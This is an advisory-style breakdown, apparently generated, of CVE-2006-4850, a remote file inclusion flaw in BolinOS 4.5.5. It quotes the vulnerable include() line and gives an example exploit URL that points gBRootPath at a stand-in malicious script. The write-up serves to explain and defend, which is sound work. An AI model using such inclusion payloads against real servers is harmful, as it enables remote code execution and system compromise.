Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-4850

**Root Cause:**
- The vulnerability stems from a flaw in the way BolinOS handles the `gBRootPath` variable. The application uses `include()` function with a path constructed using this variable, without proper sanitization.

**Weaknesses/Vulnerabilities:**
- **Remote File Inclusion (RFI):** The `gBRootPath` variable is directly used in an `include()` statement, allowing an attacker to inject a URL pointing to a malicious script.
- **Lack of Input Sanitization:** The application does not validate or sanitize the `gBRootPath` parameter before using it in a file inclusion operation.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious script from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to complete compromise of the system.
- **Data theft/manipulation**: An attacker can gain access to sensitive information and potentially manipulate the existing content.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is exploited through a specially crafted HTTP GET request to `gBIndex.php` using the vulnerable `gBRootPath` parameter.
- **Remote Server:** Attacker needs to host a malicious script on a remote server.

**Required Attacker Capabilities/Position:**
- **Network Access:** Attacker needs to have network access to the vulnerable server.
- **Malicious Script:** Attacker needs to host a malicious script on a web server accessible to the vulnerable application.
- **No Authentication Required**: The exploit does not require authentication.

**Technical Details:**
- Vulnerable code snippet: `include ($GLOBALS["gBRootPath"].$GLOBALS["gBSysPath"]."/system/_b/contentFiles/gBLib.php");`
- Exploit URL example: `http://www.site.com/[script path]/system/_b/contentFiles/gBIndex.php?gBRootPath=evil_scripts?`

**Summary**

The BolinOS 4.5.5 vulnerability is a classic Remote File Inclusion (RFI) issue.  The lack of input sanitization in the `gBRootPath` variable allows an attacker to include a remote malicious script, leading to arbitrary code execution on the server. This vulnerability can have severe consequences, including full system compromise.
